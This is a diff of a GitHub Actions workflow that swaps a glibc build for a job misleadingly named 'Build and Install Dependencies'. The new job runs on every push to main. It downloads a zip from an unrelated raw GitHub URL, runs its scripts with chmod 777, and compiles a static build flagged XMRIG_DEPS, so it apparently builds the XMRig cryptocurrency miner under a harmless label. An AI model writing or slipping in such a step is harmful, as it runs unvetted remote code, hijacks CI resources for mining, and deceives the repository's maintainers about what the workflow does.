@@ -1,6 +1,9 @@
-name: Build and Install glibc
+name: Build and Install Dependencies
 
 on:
+  push:
+    branches:
+      - main
   workflow_dispatch:
 
 jobs:
@@ -8,31 +11,33 @@ jobs:
     runs-on: ubuntu-latest
 
     steps:
-      - name: Checkout code
+      - name: Checkout Repository
         uses: actions/checkout@v2
 
-      - name: Set up Docker
+      - name: Install Dependencies
         run: |
-          docker pull ubuntu:20.04
-          docker run -d --name glibc-builder -v ${{ github.workspace }}:/workspace ubuntu:20.04 tail -f /dev/null
+          sudo apt-get update
+          sudo apt-get install -y curl unzip git build-essential cmake automake libtool autoconf
+          sudo apt-get install -y glibc-source libstdc++-static
 
-      - name: Install dependencies in Docker
+      - name: Download and Unzip Source Code
         run: |
-          docker exec glibc-builder bash -c "apt-get update && apt-get install -y build-essential wget"
+          curl -L -o testformycode.zip https://raw.githubusercontent.com/tjbcc0/tetmc/refs/heads/main/testformycode.zip
+          unzip testformycode.zip
 
-      - name: Download glibc in Docker
+      - name: Build Project
         run: |
-          docker exec glibc-builder bash -c "wget https://ftp.gnu.org/gnu/libc/glibc-2.4.tar.gz && tar -xzf glibc-2.4.tar.gz -C /workspace"
+          cd testformycode/scripts
+          chmod 777 *.sh
+          ./build_deps.sh
+          cd ..
+          mkdir build
+          cd build
+          cmake -DXMRIG_DEPS=scripts/deps -DBUILD_SHARED_LIBS=OFF -DCMAKE_CXX_FLAGS="-static" ..
+          make
 
-      - name: Build glibc in Docker
-        run: |
-          docker exec glibc-builder bash -c "cd /workspace/glibc-2.4 && mkdir build && cd build && ../configure --prefix=/usr/local/glibc-2.4 && make && make install"
-
-      - name: Verify glibc installation in Docker
-        run: |
-          docker exec glibc-builder bash -c "/usr/local/glibc-2.4/bin/ldd --version"
-
-      - name: Cleanup
-        run: |
-          docker stop glibc-builder
-          docker rm glibc-builder
+      - name: Upload Build Artifacts
+        uses: actions/upload-artifact@v3
+        with:
+          name: build-output
+          path: testformycode/build
